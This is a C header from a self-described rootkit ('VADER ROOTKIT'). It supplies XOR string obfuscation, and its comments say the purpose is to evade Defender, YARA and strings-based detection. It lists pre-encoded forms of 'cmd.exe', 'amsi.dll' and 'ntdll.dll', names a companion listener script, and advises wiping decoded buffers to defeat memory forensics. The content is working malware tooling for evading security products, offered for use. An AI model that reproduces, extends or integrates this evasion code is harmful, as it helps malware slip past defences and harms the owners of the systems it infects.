/*
 * xor.h — Shared XOR encode/decode primitives
 * ═══════════════════════════════════════════════
 * VADER ROOTKIT — 22DIV / george wu
 *
 * Single-byte XOR obfuscation for string literals in compiled binaries.
 * Defeats static signature scanning (Defender, YARA rules, strings.exe).
 * Does NOT defeat dynamic/behavioral analysis — once decoded in memory,
 * the plaintext exists on the stack until the function returns.
 *
 * Usage:
 *   1. Encode strings at build time (use vader_listener.py --gen or manual)
 *   2. Store as static const unsigned char arrays
 *   3. Copy to stack buffer, call xor_decode(), use immediately
 *   4. Zero the stack buffer after use (defense against memory forensics)
 *
 * Key: 0x41 (all modules use the same key for consistency)
 *
 * ENCODING TABLE (common strings):
 *   "cmd.exe"  → { 0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24 }
 *   "amsi.dll" → { 0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D }
 *   "ntdll.dll"→ { 0x2F, 0x35, 0x25, 0x2D, 0x2D, 0x6F, 0x25, 0x2D, 0x2D }
 *
 * To encode a new string, XOR each byte with 0x41:
 *   python -c "s='yourstring'; print(', '.join(f'0x{b^0x41:02X}' for b in s.encode()))"
 */

#ifndef VADER_XOR_H
#define VADER_XOR_H

#define VADER_XOR_KEY 0x41

static void xor_decode(unsigned char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++)
        buf[i] ^= VADER_XOR_KEY;
}

static void xor_zero(unsigned char *buf, int len)
{
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++)
        p[i] = 0;
}

#endif /* VADER_XOR_H */
